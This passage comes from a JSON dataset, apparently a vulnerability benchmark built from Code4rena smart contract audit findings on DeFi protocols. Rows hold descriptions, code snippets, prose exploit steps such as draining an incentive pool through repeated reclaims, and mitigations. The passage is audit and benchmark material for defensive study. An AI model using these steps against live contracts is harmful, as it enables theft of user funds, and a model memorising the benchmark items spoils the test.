token.\",\n      \"Fix\"\n    ],\n    \"proof_of_concept\": null,\n    \"recommended_mitigation\": null\n  },\n  {\n    \"row_number\": 48,\n    \"bug_id\": \" H-05\",\n    \"bug_label\": \" S6-4\",\n    \"difficulty\": 1,\n    \"bug_description\": \" \\\"Exchange rates from Compound are assumed with 18 decimals\\\"\",\n    \"line\": \"CTokenMultiOracle[110]\",\n    \"url\": \" https://code4rena.com/reports/2021-08-yield#h-05-exchange-rates-from-compound-are-assumed-with-18-decimals\",\n    \"title\": \"\",\n    \"main_content\": [\n      \"Submitted by shw\",\n      \"TheCTokenMultiOraclecontract assumes the exchange rates (borrowing rate) of Compound always have 18 decimals, while, however, which is not true. According to theCompound documentation, the exchange rate returned from theexchangeRateCurrentfunction is scaled by1 * 10^(18 - 8 + Underlying Token Decimals)(and so doesexchangeRateStored). Using a wrong decimal number on the exchange rate could cause incorrect pricing on tokens. SeeCTokenMultiOracle.sol#L110.\",\n      \"Recommend following the documentation and getting the decimals of the underlying tokens to set the correct decimal of aSource.\",\n      \"alcueca (Yield) confirmed:\",\n      \"alcueca (Yield) patched:\"\n    ],\n    \"code_blocks\": null,\n    \"quotes\": [\n      \"Thanks a lot for coming up with this. I had looked into how Compound defined the decimals and couldn‚Äôt find it.\"\n    ],\n    \"proof_of_concept\": null,\n    \"recommended_mitigation\": null\n  },\n  {\n    \"row_number\": 49,\n    \"bug_id\": \" H-05\",\n    \"bug_label\": \" S6-4\",\n    \"difficulty\": 1,\n    \"bug_description\": \" \\\"hybrid pool uses wrong non_optimal_mint_fee\\\"\",\n    \"line\": \"HybridPool[425]\",\n    \"url\": \" https://code4rena.com/reports/2021-09-sushitrident#h-05-hybrid-pool-uses-wrong-non_optimal_mint_fee\",\n    \"title\": \"\",\n    \"main_content\": [\n      \"Submitted by broccoli\",\n      \"When an lp provider deposits an imbalance amount of token, a swap fee is applied.HybridPooluses the same_nonOptimalMintFeeasconstantProductPool; however, since two pools use different AMM curve, the ideal balance is not the same.  ref:StableSwap3Pool.vyL322-L337\",\n      \"Stable swap Pools are designed for 1B+ TVL. Any issue related to pricing/fee is serious. I consider this is a high-risk issue\"\n    ],\n    \"code_blocks\": null,\n    \"quotes\": null,\n    \"proof_of_concept\": [\n      \"StableSwap3Pool.vy#L322-L337HybridPool.sol#L425-L441\"\n    ],\n    \"recommended_mitigation\": [\n      \"Calculate the swapping fee based on the stable swap curve. refer toStableSwap3Pool.vy#L322-L337.\",\n      \"maxsam4 (Sushi) confirmed\"\n    ]\n  },\n  {\n    \"row_number\": 50,\n    \"bug_id\": \" H-08\",\n    \"bug_label\": \" S6-4\",\n    \"difficulty\": 3,\n    \"bug_description\": \" \\\"HybridPoolÈà•Ê™ö reserve is converted to Èà•Ê∏ÅmountÈà•?twice\\\"\",\n    \"line\": \"HybridPool[253,259]\",\n    \"url\": \" https://code4rena.com/reports/2021-09-sushitrident#h-08-hybridpools-reserve-is-converted-to-amount-twice\",\n    \"title\": \"\",\n    \"main_content\": [\n      \"Submitted by cmichel, also found by 0xsanson and WatchPug\",\n      \"TheHybridPool‚Äôs reserves are stored as Bento ‚Äúamounts‚Äù (not Bento shares) in_updateReservesbecause_balance()converts the current share balance to amount balances.\\nHowever, when retrieving thereserve0/1storage fields in_getReserves, they are converted to amounts a second time.\",\n      \"TheHybridPoolreturns wrong reserves which affects all minting/burning and swap functions.\\nThey all return wrong results making the pool eventually economically exploitable or leading to users receiving less tokens than they should.\"\n    ],\n    \"code_blocks\": null,\n    \"quotes\": null,\n    \"proof_of_concept\": [\n      \"Imagine the current Bento amount / share price being1.5.\\nThe pool‚Äôs Bentosharebalance being1000._updateReserveswill store a reserve of1.5 * 1000 = 1500.\\nWhen anyone trades using theswapfunction,_getReserves()is called and multiplies it by1.5again, leading to using a reserve of 2250 instead of 1500.\\nA higher reserve for the output token leads to receiving more tokens as the swap output.\\nThus the pool lost tokens and the LPs suffer this loss.\"\n    ],\n    \"recommended_mitigation\": [\n      \"Make sure that the reserves are in the correct amounts.\",\n      \"maxsam4 (Sushi) confirmed\"\n    ]\n  },\n  {\n    \"row_number\": 51,\n    \"bug_id\": \" H-11\",\n    \"bug_label\": \" S6-3\",\n    \"difficulty\": 1,\n    \"bug_description\": \" \\\"ConstantProductPool.burnSingle swap amount computations should use balance\\\"\",\n    \"line\": \"ConstantProductPool[156,175], HybridPool[143,159]\",\n    \"url\": \" https://code4rena.com/reports/2021-09-sushitrident#h-11-constantproductpoolburnsingle-swap-amount-computations-should-use-balance\",\n    \"title\": \"\",\n    \"main_content\": [\n      \"Submitted by cmichel\",\n      \"TheConstantProductPool.burnSinglefunction is basically aburnfollowed by aswapand must therefore act the same way as calling these two functions sequentially.\",\n      \"The token amounts to redeem (amount0,amount1) are computed on thebalance(not the reserve).\\nHowever, the swap amount is then computed on thereservesand not the balance.\\nTheburnfunction would have updated thereserveto the balances and thereforebalanceshould be used here:\",\n      \"For a burn, usually thereserveshould equal thebalance, however if any new tokens are sent to the contract andbalance > reserve, this function will return slightly less swap amounts.\"\n    ],\n    \"code_blocks\": [\n      \"amount1\\n+=\\n_getAmountOut\\n(\\namount0\\n,\\n_reserve0\\n-\\namount0\\n,\\n_reserve1\\n-\\namount1\\n);\"\n    ],\n    \"quotes\": [\"‚ö†Ô∏è The same issue occurs in theHybridPool.burnSingle.\"],\n    \"proof_of_concept\": null,\n    \"recommended_mitigation\": [\n      \"Call_getAmountOutwith the balances instead of the reserves:_getAmountOut(amount0, balance0 - amount0, balance1 - amount1)\",\n      \"maxsam4 (Sushi) confirmed:\",\n      \"Please bump this to High sev. This bug can actually lead to loss of funds from the pool. The author found the right issue but failed to analyze the full impact. Regardless, I think they deserve ‚ÄúHigh‚Äù for pointing this out.\",\n      \"alcueca (judge) commented:\",\n      \"This is what we come to C4 for\"\n    ]\n  },\n  {\n    \"row_number\": 52,\n    \"bug_id\": \" H-14\",\n    \"bug_label\": \" S6-4\",\n    \"difficulty\": 1,\n    \"bug_description\": \" \\\"Incorrect usage of _pow in _computeSingleOutGivenPoolIn of IndexPool\\\"\",\n    \"line\": \"IndexPool[268,279]\",\n    \"url\": \" https://code4rena.com/reports/2021-09-sushitrident#h-14-incorrect-usage-of-_pow-in-_computesingleoutgivenpoolin-of-indexpool\",\n    \"title\": \"\",\n    \"main_content\": [\n      \"Submitted by broccoli\",\n      \"The_computeSingleOutGivenPoolInfunction ofIndexPooluses the_powfunction to calculatetokenOutRatiowith the exponent inWAD(i.e., in 18 decimals of precision). However, the_powfunction assumes that the given exponentnis not inWAD. (for example,_pow(5, BASE)returns5 ** (10 ** 18)instead of5 ** 1). The misuse of the_powfunction could causes an integer overflow in the_computeSingleOutGivenPoolInfunction and thus prevent any function from calling it.\"\n    ],\n    \"code_blocks\": null,\n    \"quotes\": null,\n    \"proof_of_concept\": [\"Referenced code:IndexPool.sol#L279\"],\n    \"recommended_mitigation\": [\n      \"Change the_powfunction to the_computefunction, which supports exponents inWAD.\",\n      \"maxsam4 (Sushi) confirmed\"\n    ]\n  },\n  {\n    \"row_number\": 53,\n    \"bug_id\": \" H-15\",\n    \"bug_label\": \" S6-4\",\n    \"difficulty\": 1,\n    \"bug_description\": \" \\\"Incorrect multiplication in _computeSingleOutGivenPoolIn of IndexPool\\\"\",\n    \"line\": \"IndexPool[268,282]\",\n    \"url\": \" https://code4rena.com/reports/2021-09-sushitrident#h-15-incorrect-multiplication-in-_computesingleoutgivenpoolin-of-indexpool\",\n    \"title\": \"\",\n    \"main_content\": [\n      \"Submitted by broccoli\",\n      \"The_computeSingleOutGivenPoolInfunction ofIndexPooluses the raw multiplication (i.e.,*) to calculate thezazvariable. However, since both(BASE - normalizedWeight)and_swapFeeare inWAD, the_mulfunction should be used instead to calculate the correct value ofzaz. Otherwise,zazwould be10 ** 18times larger than the expected value and causes an integer underflow when calculatingamountOut. The incorrect usage of multiplication prevents anyone from calling the function successfully.\"\n    ],\n    \"code_blocks\": null,\n    \"quotes\": null,\n    \"proof_of_concept\": [\"Referenced code:IndexPool.sol#L282\"],\n    \"recommended_mitigation\": [\n      \"Change(BASE - normalizedWeight) * _swapFeeto_mul((BASE - normalizedWeight), _swapFee).\",\n      \"maxsam4 (Sushi) confirmed\"\n    ]\n  },\n  {\n    \"row_number\": 54,\n    \"bug_id\": \" H-01\",\n    \"bug_label\": \" S6-3\",\n    \"difficulty\": 1,\n    \"bug_description\": \" \\\"Controller.setCap sets wrong vault balance\\\"\",\n    \"line\": \"Controller[242]\",\n    \"url\": \" https://code4rena.com/reports/2021-09-yaxis#h-01-controllersetcap-sets-wrong-vault-balance\",\n    \"title\": \"\",\n    \"main_content\": [\n      \"Submitted by cmichel\",\n      \"TheController.setCapfunction sets a cap for a strategy and withdraws any excess amounts (_diff).\\nThe vault balance is decreased by the entire strategy balance instead of by this_diff:\",\n      \"The_vaultDetails[_vault].balancevariable does not correctly track the actual vault balances anymore, it will usuallyunderestimatethe vault balance.\\nThis variable is used inController.balanceOf(), which in turn is used inVault.balance(), which in turn is used to determine how many shares to mint / amount to receive when redeeming shares.\\nIf the value is less, users will lose money as they can redeem fewer tokens.\\nAlso, an attacker candepositand will receive more shares than they should receive. They can then wait until the balance is correctly updated again and withdraw their shares for a higher amount than they deposited. This leads to the vault losing tokens.\"\n    ],\n    \"code_blocks\": [\n      \"// @audit why not sub _diff?\\n_vaultDetails\\n[\\n_vault\\n].\\nbalance\\n=\\n_vaultDetails\\n[\\n_vault\\n].\\nbalance\\n.\\nsub\\n(\\n_balance\\n);\"\n    ],\n    \"quotes\": null,\n    \"proof_of_concept\": null,\n    \"recommended_mitigation\": [\n      \"Sub the_diffinstead of thebalance:_vaultDetails[_vault].balance = _vaultDetails[_vault].balance.sub(_diff);\",\n      \"Haz077 (yAxis) confirmed and patched:\",\n      \"Already fixed in code-423n4/2021-09-yaxis#1\",\n      \"GalloDaSballo (judge) commented:\",\n      \"Finding is valid, has been mitigated by sponsor as of 14 days ago\"\n    ]\n  },\n  {\n    \"row_number\": 55,\n    \"bug_id\": \" H-07\",\n    \"bug_label\": \" S6-4\",\n    \"difficulty\": 1,\n    \"bug_description\": \" \\\"Vault.balance() mixes normalized and standard amounts\\\"\",\n    \"line\": \"Vault[303,315,323]\",\n    \"url\": \" https://code4rena.com/reports/2021-09-yaxis#h-07-vaultbalance-mixes-normalized-and-standard-amounts\",\n    \"title\": \"\",\n    \"main_content\": [\n      \"Submitted by cmichel\",\n      \"TheVault.balancefunction uses thebalanceOfThisfunction which scales (‚Äúnormalizes‚Äù) all balances to 18 decimals.\",\n      \"Note thatbalance()‚Äôs second termIController(manager.controllers(address(this))).balanceOf()is not normalized.\\nThe code is adding a non-normalized amount (for example 6 decimals only for USDC) to a normalized (18 decimals).\",\n      \"The result is that thebalance()will be under-reported.\\nThis leads to receiving wrong shares whendepositing tokens, and a wrong amount when redeemingtokens.\"\n    ],\n    \"code_blocks\": [\n      \"for\\n(\\nuint8\\ni\\n;\\ni\\n<\\n_tokens\\n.\\nlength\\n;\\ni\\n++) {\\naddress\\n_token\\n=\\n_tokens\\n[\\ni\\n];\\n// everything is padded to 18 decimals\\n_balance\\n=\\n_balance\\n.\\nadd\\n(\\n_normalizeDecimals\\n(\\n_token\\n,\\nIERC20\\n(\\n_token\\n).\\nbalanceOf\\n(\\naddress\\n(\\nthis\\n))));\\n}\"\n    ],\n    \"quotes\": null,\n    \"proof_of_concept\": null,\n    \"recommended_mitigation\": [\n      \"The second termIController(manager.controllers(address(this))).balanceOf()must also be normalized before adding it.IController(manager.controllers(address(this))).balanceOf()uses_vaultDetails[msg.sender].balancewhich directly uses the raw token amounts which are not normalized.\",\n      \"GainsGoblin (yAxis) acknowledged\",\n      \"GalloDaSballo (judge) commented:\",\n      \"balanceandbalanceOfThismixes the usage of decimals by alternatingly using_normalizeDecimalsThis can break accounting as well as create opportunities for abuse\\nA consistent usage of_normalizeDecimalswould mitigate\",\n      \"BobbyYaxis (yAxis) noted:\",\n      \"Mitigated in PR 114:https://github.com/yaxis-project/metavault/pull/114/commits/b3c0405640719aa7d43560f4b4b910b7ba88170b\"\n    ]\n  },\n  {\n    \"row_number\": 56,\n    \"bug_id\": \" H-08\",\n    \"bug_label\": \" S6-4\",\n    \"difficulty\": 3,\n    \"bug_description\": \" \\\"Vault.withdraw mixes normalized and standard amounts\\\"\",\n    \"line\": \"Vault[249,231,303,315,323]\",\n    \"url\": \" https://code4rena.com/reports/2021-09-yaxis#h-08-vaultwithdraw-mixes-normalized-and-standard-amounts\",\n    \"title\": \"\",\n    \"main_content\": [\n      \"Submitted by cmichel, also found by hickuphh3 and jonah1005\",\n      \"TheVault.balancefunction uses thebalanceOfThisfunction which scales (‚Äúnormalizes‚Äù) all balances to 18 decimals.\",\n      \"Note thatbalance()‚Äôs second termIController(manager.controllers(address(this))).balanceOf()is not normalized, but it must be.\",\n      \"This leads to many issues through the contracts that usebalancebut don‚Äôt treat these values as normalized values.\\nFor example, inVault.withdraw, the computed_amountvalue is normalized (in 18 decimals).\\nBut theuint256 _balance = IERC20(_output).balanceOf(address(this));value is not normalized but compared to the normalized_amountand even subtracted:\",\n      \"Imagine inwithdraw, theoutputis USDC with 6 decimals, then the normalized_toWithdrawwith 18 decimals (due to using_amount) will be a huge number and attempt to withdraw an inflated amount.\\nAn attacker can steal tokens this way by withdrawing a tiny amount of shares and receive an inflated USDC or USDT amount (or any_outputtoken with less than 18 decimals).\"\n    ],\n    \"code_blocks\": [\n      \"for\\n(\\nuint8\\ni\\n;\\ni\\n<\\n_tokens\\n.\\nlength\\n;\\ni\\n++) {\\naddress\\n_token\\n=\\n_tokens\\n[\\ni\\n];\\n// everything is padded to 18 decimals\\n_balance\\n=\\n_balance\\n.\\nadd\\n(\\n_normalizeDecimals\\n(\\n_token\\n,\\nIERC20\\n(\\n_token\\n).\\nbalanceOf\\n(\\naddress\\n(\\nthis\\n))));\\n}\",\n      \"// @audit compares unnormalzied output to normalized output\\nif\\n(\\n_balance\\n<\\n_amount\\n) {\\nIController\\n_controller\\n=\\nIController\\n(\\nmanager\\n.\\ncontrollers\\n(\\naddress\\n(\\nthis\\n)));\\n// @audit cannot directly subtract unnormalized\\nuint256\\n_toWithdraw\\n=\\n_amount\\n.\\nsub\\n(\\n_balance\\n);\\nif\\n(\\n_controller\\n.\\nstrategies\\n() >\\n0\\n) {\\n_controller\\n.\\nwithdraw\\n(\\n_output\\n,\\n_toWithdraw\\n);\\n}\\nuint256\\n_after\\n=\\nIERC20\\n(\\n_output\\n).\\nbalanceOf\\n(\\naddress\\n(\\nthis\\n));\\nuint256\\n_diff\\n=\\n_after\\n.\\nsub\\n(\\n_balance\\n);\\nif\\n(\\n_diff\\n<\\n_toWithdraw\\n) {\\n_amount\\n=\\n_balance\\n.\\nadd\\n(\\n_diff\\n);\\n}\\n}\"\n    ],\n    \"quotes\": null,\n    \"proof_of_concept\": null,\n    \"recommended_mitigation\": [\n      \"Whenever using anything involvingvault.balanceOfThis()orvault.balance()one needs to be sure that any derived token amount needs to be denormalized again before using them.\",\n      \"GalloDaSballo (judge) commented:\",\n      \"An inconsistent usage of_normalizeDecimalswill cause accounting issues and potentially paths for an exploit\",\n      \"BobbyYaxis (yAxis) noted:\",\n      \"Mitigated in PR 114:https://github.com/yaxis-project/metavault/pull/114/commits/b3c0405640719aa7d43560f4b4b910b7ba88170b\"\n    ]\n  },\n  {\n    \"row_number\": 57,\n    \"bug_id\": \" H-01\",\n    \"bug_label\": \" S6-4\",\n    \"difficulty\": 2,\n    \"bug_description\": \" \\\"veCVXStrategy.manualRebalance has wrong logic\\\"\",\n    \"line\": \"veCVXStrategy[444,468,471,477]\",\n    \"url\": \" https://code4rena.com/reports/2021-09-bvecvx#h-01-vecvxstrategymanualrebalance-has-wrong-logic\",\n    \"title\": \"\",\n    \"main_content\": [\n      \"Submitted by cmichel, also found by tabish\",\n      \"TheveCVXStrategy.manualRebalancefunction computes two ratioscurrentLockRatioandnewLockRatioand compares them.\",\n      \"However, these ratios compute different things and are not comparable:\",\n      \"currentLockRatio = balanceInLock.mul(10**18).div(totalCVXBalance)is apercentage valuewith 18 decimals (i.e.1e18 = 100%). Its max value can at most be1e18.\",\n      \"newLockRatio = totalCVXBalance.mul(toLock).div(MAX_BPS)is aCVX token amount. It‚Äôs unbounded and just depends on thetotalCVXBalanceamount.\",\n      \"The comparison that follows does not make sense:\",\n      \"The rebalancing is broken and does not correctly rebalance. It usually leads to locking nearly everything iftotalCVXBalanceis high.\"\n    ],\n    \"code_blocks\": [\n      \"if\\n(\\nnewLockRatio\\n<=\\ncurrentLockRatio\\n) {\\n// ...\\n}\"\n    ],\n    \"quotes\": null,\n    \"proof_of_concept\": [\"sol#L444L453\"],\n    \"recommended_mitigation\": [\n      \"Judging from the cvxToLock = newLockRatio.sub(currentLockRatio) it seems the desired computation is that the ‚Äúratios‚Äù should actually be in CVX amounts and not in percentages. Therefore, currentLockRatio should just be balanceInLock. (The variables should be renamed as they aren‚Äôt really ratios but absolute CVX balance amounts.)\"\n    ]\n  },\n  {\n    \"row_number\": 58,\n    \"bug_id\": \" H-01\",\n    \"bug_label\": \" S6-3\",\n    \"difficulty\": 2,\n    \"bug_description\": \" \\\"Use of tokenBÈà•Ê™ö price instead of tokenA in determining account health will lead to protocol mis-accounting and insolvency\\\"\",\n    \"line\": \"LendingPair[119,266,289,340,398,532,544,674]\",\n    \"url\": \" https://code4rena.com/reports/2021-09-wildcredit#h-01-use-of-tokenbs-price-instead-of-tokena-in-determining-account-health-will-lead-to-protocol-mis-accounting-and-insolvency\",\n    \"title\": \"\",\n    \"main_content\": [\n      \"Submitted by 0xRajeev, also found by WatchPug.\",\n      \"In_supplyCreditUni(), the last argument of_convertTokenValues()onL674 being _priceBinstead of_priceAin the calculation ofsupplyBis a typo (should be_priceA) and therefore miscalculatessupplyB,creditB,creditUniand thereforetotalAccountSupplyin functionaccountHealth()which affects the health of account/protocol determination that is used across all borrows/withdrawals/transfers/liquidations in the protocol. This miscalculation significantly affects all calculations in protocol and could therefore cause protocol insolvency.\",\n      \"Manual Analysis\"\n    ],\n    \"code_blocks\": null,\n    \"quotes\": null,\n    \"proof_of_concept\": [\n      \"https://github.com/code-423n4/2021-09-wildcredit/blob/c48235289a25b2134bb16530185483e8c85507f8/contracts/LendingPair.sol#L674https://github.com/code-423n4/2021-09-wildcredit/blob/c48235289a25b2134bb16530185483e8c85507f8/contracts/LendingPair.sol#L340https://github.com/code-423n4/2021-09-wildcredit/blob/c48235289a25b2134bb16530185483e8c85507f8/contracts/LendingPair.sol#L398-L401https://github.com/code-423n4/2021-09-wildcredit/blob/c48235289a25b2134bb16530185483e8c85507f8/contracts/LendingPair.sol#L532https://github.com/code-423n4/2021-09-wildcredit/blob/c48235289a25b2134bb16530185483e8c85507f8/contracts/LendingPair.sol#L544https://github.com/code-423n4/2021-09-wildcredit/blob/c48235289a25b2134bb16530185483e8c85507f8/contracts/LendingPair.sol#L119https://github.com/code-423n4/2021-09-wildcredit/blob/c48235289a25b2134bb16530185483e8c85507f8/contracts/LendingPair.sol#L266https://github.com/code-423n4/2021-09-wildcredit/blob/c48235289a25b2134bb16530185483e8c85507f8/contracts/LendingPair.sol#L289\"\n    ],\n    \"recommended_mitigation\": [\n      \"Change the last argument of\\\\_convertTokenValues()from\\\\_priceBto\\\\_priceAon L674.\",\n      \"talegift (Wild Credit) confirmed\"\n    ]\n  },\n  {\n    \"row_number\": 59,\n    \"bug_id\": \" H-01\",\n    \"bug_label\": \" S6-4\",\n    \"difficulty\": 2,\n    \"bug_description\": \" \\\"The formula of number of prizes for a degree is wrong\\\"\",\n    \"line\": \"DrawCalculator[423]\",\n    \"url\": \" https://code4rena.com/reports/2021-10-pooltogether#h-01-the-formula-of-number-of-prizes-for-a-degree-is-wrong\",\n    \"title\": \"\",\n    \"main_content\": [\n      \"Submitted by WatchPug, also found by cmichel.\",\n      \"The formula of the number of prizes for a degree per the document:https://v4.docs.pooltogether.com/protocol/concepts/prize-distribution/#splitting-the-prizesis:\",\n      \"Should be changed to:\",\n      \"or\",\n      \"Per the document:\",\n      \"Due to the miscalculation ofnumber of prizes for a degree, it will be smaller than expected, as a result,prize for a degreewill be larger than expected. Making the protocol giving out more prizes than designed.\",\n      \"Because2^x = 1 << x\",\n      \"Therefore, whenn > 0:\",\n      \"QED.\",\n      \"By definition,degree nis constructed by 3 chunks:\",\n      \"The first N numbers, must equal the matching numbers. Number of possible values:1;\",\n      \"The N-th number, must not equal the N-th matching number. Number of possible values:2^bitRange - 1\",\n      \"From N (not include) until the end. Number of possible values:2 ^ (bitRange * (n-1))\",\n      \"Therefore, totalnumberOfPrizesForDegreewill be:\",\n      \"QED.\",\n      \"https://github.com/pooltogether/v4-core/blob/055335bf9b09e3f4bbe11a788710dd04d827bf37/contracts/DrawCalculator.sol#L423-L431\",\n      \"L423-431 should change to:\",\n      \"BTW, the comment on L416 is wrong:\",\n      \"seems like it‚Äôs copied from\\\\_calculatePrizeTierFraction()\",\n      \"plus, it‚Äôs not base 1e18 but base 1e9\",\n      \"PierrickGT (PoolTogether) confirmed and patched:\",\n      \"Alex the Entreprenerd (judge) commented:\"\n    ],\n    \"code_blocks\": [\n      \"Number of prizes for a degree = (2^bit range)^degree - (2^bit range)^(degree-1) - (2^bit range)^(degree-2) - ...\",\n      \"Number of prizes for a degree = (2^bit range)^degree - (2^bit range)^(degree-1)\",\n      \"Number of prizes for a degree = 2^(bit range * degree) - 2^(bit range * (degree-1))\",\n      \"2 ^ {bitRange \\\\times n} = f(bitRange, n) + f(bitRange, n-1) + f(bitRange, n-2) + ... + f(bitRange, 1) + f(bitRange, 0)\\nf(bitRange, n) = 2 ^ {bitRange \\\\times n} - ( f(bitRange, n-1) + f(bitRange, n-2) + ... + f(bitRange, 1) + f(bitRange, 0) )\\nf(bitRange, n) = 2 ^ {bitRange \\\\times n} - f(bitRange, n-1) - ( f(bitRange, n-2) + ... + f(bitRange, 1) + f(bitRange, 0) )\\nBecause:\\n2 ^ {bitRange \\\\times (n-1)} = f(bitRange, n-1) + f(bitRange, n-2) + ... + f(bitRange, 1) + f(bitRange, 0)\\n2 ^ {bitRange \\\\times (n-1)} - f(bitRange, n-1) = f(bitRange, n-2) + ... + f(bitRange, 1) + f(bitRange, 0)\\nTherefore:\\nf(bitRange, n) = 2 ^ {bitRange \\\\times n} - f(bitRange, n-1) - ( 2 ^ {bitRange \\\\times (n-1)} - f(bitRange, n-1) )\\nf(bitRange, n) = 2 ^ {bitRange \\\\times n} - f(bitRange, n-1) - 2 ^ {bitRange \\\\times (n-1)} + f(bitRange, n-1)\\nf(bitRange, n) = 2 ^ {bitRange \\\\times n} - 2 ^ {bitRange \\\\times (n-1)}\",\n      \"f(bitRange, n) = ( 1 << bitRange * n ) - ( 1 << bitRange * (n - 1) )\",\n      \"f(bitRange, n) = (2 ^ {bitRange} - 1) \\\\times 2 ^ {bitRange \\\\times (n - 1)}\\nf(bitRange, n) = 2 ^ {bitRange} \\\\times 2 ^ {bitRange \\\\times (n - 1)} - 2 ^ {bitRange \\\\times (n - 1)}\\nf(bitRange, n) = 2 ^ {bitRange + bitRange \\\\times (n - 1)} - 2 ^ {bitRange \\\\times (n - 1)}\\nf(bitRange, n) = 2 ^ {bitRange + bitRange \\\\times n - bitRange} - 2 ^ {bitRange \\\\times (n - 1)}\\nf(bitRange, n) = 2 ^ {bitRange \\\\times n} - 2 ^ {bitRange \\\\times (n - 1)}\",\n      \"/**\\n*\\n@notice\\nCalculates the number of prizes for a given prizeDistributionIndex\\n*\\n@param\\n_bitRangeSize\\nBit range size for Draw\\n*\\n@param\\n_prizeTierIndex\\nIndex of the prize tier array to calculate\\n*\\n@return\\nreturns the fraction of the total prize (base 1e18)\\n*/\\nfunction\\n_numberOfPrizesForIndex\\n(\\nuint8\\n_bitRangeSize\\n,\\nuint256\\n_prizeTierIndex\\n)\\ninternal\\npure\\nreturns\\n(\\nuint256\\n)\\n{\\nuint256\\nbitRangeDecimal\\n=\\n2\\n**\\nuint256\\n(\\n_bitRangeSize\\n);\\nuint256\\nnumberOfPrizesForIndex\\n=\\nbitRangeDecimal\\n**\\n_prizeTierIndex\\n;\\nwhile\\n(\\n_prizeTierIndex\\n>\\n0\\n) {\\nnumberOfPrizesForIndex\\n-=\\nbitRangeDecimal\\n**(\\n_prizeTierIndex\\n-\\n1\\n);\\n_prizeTierIndex\\n--;\\n}\\nreturn\\nnumberOfPrizesForIndex\\n;\\n}\",\n      \"if\\n(\\n_prizeTierIndex\\n>\\n0\\n) {\\nreturn\\n(\\n1\\n<<\\n_bitRangeSize\\n*\\n_prizeTierIndex\\n) - (\\n1\\n<<\\n_bitRangeSize\\n* (\\n_prizeTierIndex\\n-\\n1\\n) );\\n}\\nelse\\n{\\nreturn\\n1\\n;\\n}\"\n    ],\n    \"quotes\": [\n      \"prize for a degree = total prize * degree percentage / number of prizes for a degree\",\n      \"We will usef(bitRange, degree)to representnumberOfPrizesForDegree(bitRangeSize, degree).\",\n      \"PR:https://github.com/pooltogether/v4-core/pull/242\",\n      \"The warden found the usage of an incorrect formula that would cause the protocol to give out larger prizes than expected, the sponsor has mitigated in a following PR\"\n    ],\n    \"proof_of_concept\": null,\n    \"recommended_mitigation\": null\n  },\n  {\n    \"row_number\": 60,\n    \"bug_id\": \" H-03\",\n    \"bug_label\": \" S3-1\",\n    \"difficulty\": 5,\n    \"bug_description\": \" \\\"ConcentratedLiquidityPoolManagerÈà•Ê™ö incentives can be stolen\\\"\",\n    \"line\": \"ConcentratedLiquidityPoolManager[49]\",\n    \"url\": \" https://code4rena.com/reports/2021-09-sushitrident-2#h-03-concentratedliquiditypoolmanagers-incentives-can-be-stolen\",\n    \"title\": \"\",\n    \"main_content\": [\n      \"Submitted by cmichel, also found by broccoli, hickuphh3, pauliax, and WatchPug\",\n      \"TheConcentratedLiquidityPoolManagerkeeps all tokens for all incentives in the same contract. ThereclaimIncentivefunction does not reduce theincentive.rewardsUnclaimedfield and thus one can reclaim tokens several times.\\nThis allows anyone to steal all tokens from all incentives by creating an incentive themself, and once it‚Äôs expired, repeatedly claim the unclaimed rewards until the token balance is empty.\",\n      \"An attacker can steal all tokens in thePoolManager.\"\n    ],\n    \"code_blocks\": null,\n    \"quotes\": null,\n    \"proof_of_concept\": [\n      \"Attacker creates an incentive for a non-existent pool using a random address forpool(This is done such that no other user can claim rewards as we need a non-zerorewardsUnclaimedbalance for expiry). They choose theincentive.tokento be the token they want to steal from other incentives. (for example,WETH,USDC, orSUSHI) They choose thestartTime, endTime, expirysuch that the checks pass, i.e., starting and ending in a few seconds from now, expiring in 5 weeks. Then they choose a non-zerorewardsUnclaimedand transfer theincentive.tokento thePoolManager.Attacker waits for 5 weeks until the incentive is expiredAttacker can now callreclaimIncentive(pool, incentiveId, amount=incentive.rewardsUnclaimed, attacker, false)to withdrawincentive.rewardsUnclaimedofincentive.tokenfrom the pool manager.As theincentive.rewardsUnclaimedvariable has not been decreased, they can keep callingreclaimIncentiveuntil the pool is drained.\"\n    ],\n    \"recommended_mitigation\": [\n      \"InreclaimIncentive, reduceincentive.rewardsUnclaimedby the withdrawnamount.\",\n      \"sarangparikh22 (Sushi) confirmed\"\n    ]\n  },\n  {\n    \"row_number\": 61,\n    \"bug_id\": \" H-08\",\n    \"bug_label\": \" S6-4\",\n    \"difficulty\": 1,\n    \"bug_description\": \" \\\"Wrong inequality when adding/removing liquidity in current price range\\\"\",\n    \"line\": \"ConcentratedLiquidityPool[141,176,231,242]\",\n    \"url\": \" https://code4rena.com/reports/2021-09-sushitrident-2#h-08-wrong-inequality-when-addingremoving-liquidity-in-current-price-range\",\n    \"title\": \"\",\n    \"main_content\": [\n      \"Submitted by cmichel\",\n      \"TheConcentratedLiquidityPool.mint/burnfunctions add/removeliquiditywhen(priceLower < currentPrice && currentPrice < priceUpper).\\nShouldn‚Äôt it also be changed ifpriceLower == currentPrice?\",\n      \"Pools that mint/burn liquidity at a time where thecurrentPriceis right at the lower price range do not work correctly and will lead to wrong swap amounts.\"\n    ],\n    \"code_blocks\": null,\n    \"quotes\": null,\n    \"proof_of_concept\": null,\n    \"recommended_mitigation\": [\n      \"Change the inequalities toif (priceLower <= currentPrice && currentPrice < priceUpper).\",\n      \"sarangparikh22 (Sushi) disputed:\",\n      \"You shouldn‚Äôt be able to reach this, can you produce a POC?\",\n      \"alcueca (judge) commented:\",\n      \"@sarangparikh22 (Sushi), could you please elaborate on why this is not reachable?\",\n      \"sarangparikh22 (Sushi) confirmed:\",\n      \"I confused this with another similar issue, my apologies, took a look at this, and this a valid issue, we should probably even bump the severity to Sev 3, not sure if I am allowed to do so haha, I created a PoC in which users can actually loose funds, when they add liquidity in that specific range. @alcueca (judge)\",\n      \"alcueca (judge) commented:\",\n      \"Sponsors are allowed to bump up severity, and I‚Äôve done it myself in my past as a sponsor as well.\"\n    ]\n  },\n  {\n    \"row_number\": 62,\n    \"bug_id\": \" H-10\",\n    \"bug_label\": \" S6-3\",\n    \"difficulty\": 1,\n    \"bug_description\": \" \\\"ConcentratedLiquidityPool.burn() Wrong implementation\\\"\",\n    \"line\": \"ConcentratedLiquidityPool[231,263]\",\n    \"url\": \" https://code4rena.com/reports/2021-09-sushitrident-2#h-10-concentratedliquiditypoolburn-wrong-implementation\",\n    \"title\": \"\",\n    \"main_content\": [\n      \"Submitted by WatchPug\",\n      \"The reserves should be updated once LP tokens are burned to match the actual total bento shares hold by the pool.\",\n      \"However, the current implementation only updated reserves with the fees subtracted.\",\n      \"Makes thereserve0andreserve1smaller than the currentbalance0andbalance1.\",\n      \"As a result, many essential features of the contract will malfunction, includesswap()andmint().\"\n    ],\n    \"code_blocks\": 